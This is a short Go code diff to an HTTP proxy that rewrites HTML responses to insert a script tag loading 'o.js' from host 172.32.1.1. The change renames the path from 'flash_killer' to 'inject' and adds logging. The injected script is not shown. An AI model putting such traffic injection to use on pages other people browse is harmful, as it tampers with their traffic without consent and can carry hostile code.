@@ -24,7 +24,8 @@ func (ins *ScriptInserter) Write(p []byte) (n int, err error) {
 			}
 			p = p[Befn:]
 
-			n, err = ins.Browser.Write([]byte("<script src=\"http://172.32.1.1/flash_killer/o.js\"></script>"))
+			log.Println("Inserting script tag.")
+			n, err = ins.Browser.Write([]byte("<script src=\"http://172.32.1.1/inject/o.js\"></script>"))
 			if err != nil {
 				log.Println("Trying to write the script insert but could not complete, Result = fucked up webpage.")
 				panic(err)
@@ -82,7 +83,7 @@ func PageRequested(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(resp.StatusCode)
 
 	TryToInsert := false
-	//no Idea to inssert stuff if it is commpressed
+	//Dont to inssert stuff if the data is commpressed
 	if RemoveCommpression {
 		//We only want to insert in to html pages
 		if val, ok := resp.Header["Content-Type"]; ok {
